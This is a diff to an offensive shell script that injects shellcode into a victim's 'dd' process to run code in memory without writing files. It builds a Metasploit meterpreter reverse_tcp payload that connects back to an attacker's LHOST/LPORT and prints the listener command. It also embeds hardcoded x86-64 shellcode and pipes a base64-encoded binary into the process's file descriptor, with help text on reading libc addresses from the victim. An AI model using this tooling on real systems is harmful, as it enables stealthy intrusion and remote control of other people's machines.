@@ -23,8 +23,8 @@ read -r -d '' HELP <<- EOM
     Arguments:
       -h Print this help.
       -d Path to the victim dd binary (you should download it from the victim). Find it with 'command -v dd' Required.
-      -l Path to the victim libc (you should download it from the victim).Required with mode "retsled". Find it with 'ldd `command -v dd` | grep libc | cut -d' ' -f3'.
-      -b Libc base address in the victim system. Required for mode "retsled". Execute: printf "0x";(linux64 -R setarch $ARCH -R cat /proc/self/maps || setarch `arch` -R cat /proc/self/maps) | grep libc | head -n1 | cut -d'-' -f1
+      -l Path to the victim libc (you should download it from the victim).Required with mode "retsled". Find it with 'ldd \`command -v dd\` | grep libc | cut -d" " -f3'.
+      -b Libc base address in the victim system. Required for mode "retsled". Execute in the victim: printf "0x";(linux64 -R cat /proc/self/maps || setarch \`arch\` -R cat /proc/self/maps) | grep -E "libc|ld-musl" | head -n1 | cut -d'-' -f1
       -H LHOST to receive the meterpreter.
       -P LPORT to receive the meterpreter.
       -p Metasploit payload (by default linux/x64/meterpreter/reverse_tcp).
@@ -78,7 +78,7 @@ if [ "$(readelf -d $DD_PATH | grep 'BIND_NOW')" ] && [ "$MODE" = "fclose_got" ];
 fi
 
 if ! ([ "$LIBC_PATH" ] && [ "$LIBC_BASE" ] && [ -f "$LIBC_PATH" ]) && [ "$MODE" = "retsled" ]; then
-    >&2 echo "Set the path to the libc library downloaded from the victim system and the base address of libc (this is needed with 'retsled'' mode)"
+    >&2 echo "Set the path to the libc library downloaded from the victim system and the base address of libc (this is needed with 'retsled' mode)"
     >&2 echo "$HELP"
     exit 1
 fi
@@ -108,6 +108,10 @@ if [ "$LHOST" ] && [ "$LPORT" ] && [ "$PAYLOAD" ]; then
     >&2 echo "Execute: msfconsole -q -x 'use exploit/multi/handler; set payload $PAYLOAD; set LHOST $LHOST; set LPORT $LPORT; run'"
     SHELLCODE=$(msfvenom -p $PAYLOAD LHOST=$LHOST LPORT=$LPORT -f hex 2>/dev/null)
     >&2 read -p "Press enter to continue"
+fi
+
+if [ "$BIN_PATH" ]; then
+    SHELLCODE="4831c04831ff66bf0a00b8200000000f054831c048ffc7b8200000000f0568414141414889e7be00000000b83f0100000f05b8220000000f054831c04883c03c4831ff0f05"
 fi
 
 SHELLCODE_LENGTH=$(echo -n $SHELLCODE | wc -c)
@@ -267,11 +271,20 @@ fi
 
 
 if [ "$BIN_PATH" ]; then
-    SHELLCODE="4831c04831ff66bf0a00b8200000000f054831c048ffc7b8200000000f0568414141414889e7be00000000b83f0100000f05b8220000000f054831c04883c03c4831ff0f05"
     >&2 echo ""
     >&2 echo ""
     >&2 echo ""
-    >&2 echo '[+] Execute this after the shellcode that shuold have been printed before (or that you should have in your clipboard'
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo ""
+    >&2 echo "===================================================================================================================="
+    >&2 echo '[+] Execute this after the shellcode that shuold have been printed before (or that you should have in your clipboard)'
     >&2 echo '[+] This is the code you will need to execute to load the binary in memory (you might need to change the fd number):'
-    >&2 echo "echo '$(base64 -w0 $BIN_PATH)' | base64 -d > /proc/\$(pidof dd)/fd/0" 
+    >&2 echo "echo '$(base64 -w0 $BIN_PATH)' | base64 -d > /proc/\$(pidof dd)/fd/<num>"
 fi
